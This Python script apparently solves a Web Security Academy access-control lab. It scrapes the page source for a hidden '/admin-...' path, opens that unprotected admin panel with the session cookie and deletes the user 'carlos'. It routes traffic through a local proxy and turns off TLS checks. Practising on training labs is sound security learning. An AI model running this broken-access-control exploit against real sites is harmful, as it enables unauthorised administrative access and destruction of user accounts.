#####################
#    Libraries      #
#####################
import requests
import sys
import urllib3
import argparse
import re
import gc

#####################
#    Variables      #
#####################

## Disable requests warning
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


## Setup Proxies for future debugs
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

parser = argparse.ArgumentParser(prog=f'\n[+] WebAcademy Access Control: Lab 2'
                                ,description="Description: Accesses the Admin Panel that has and unpredictable location\n and Delete Carlos' user"
                                ,epilog='----------------------- END ---------------------------')
parser.add_argument('-u', metavar ='[--url]', action='store', dest='url', type=str, required=True, help="Target's URL")

args = parser.parse_args()

#####################
#    Functions      #
#####################
def find_admin_panel(url):
    r = requests.get(url, verify=False, proxies=proxies)
    session_cookie = r.cookies.get_dict().get('session')
    admin_panel_url = ''.join(re.findall(r"/admin-\w+",r.text))
    if admin_panel_url:
        delete_user(url+admin_panel_url,session_cookie)
    else:
        print('[-] Administrator panel not found.')
        print('[-] Exiting the script...')


def delete_user(admin_panel_url,session_cookies):
    
    cookies = {'session':session_cookies}
    r = requests.get(admin_panel_url, verify=False, cookies=cookies, proxies=proxies)
    
    if r.status_code == 200:
        print('[+] Found the Administrator Panel!')
        print('[+] Deleting Carlos user...')
        delete_carlos_url = admin_panel_url + '/delete'
        params = { 'username':'carlos' }
        r = requests.get(delete_carlos_url, params=params, verify=False, cookies=cookies, proxies=proxies)
        if r.status_code == 200:
            print('[+] Carlos user deleted! You rocked the lab!')

        else:
            print('[-] Could not delete user.')
            gc.collect()
            sys.exit(-1)
    else:
        print("[-] Couldn't access Administrator Panel.")
        print('[-] Exiting the script...')
        gc.collect()
        sys.exit(-1)

def main():
    if len(sys.argv) != 3:
        print(f"[+] Usage: {sys.argv[0]} -u <lab's url>")
        print(f"[+] Example: {sys.argv[0]} -u www.example.com")
        gc.collect()
        sys.exit(-1)

    
    url = args.url.rstrip('/')
    print("[+] Finding admin panel...")
    find_admin_panel(url)

if __name__ == "__main__":
    main()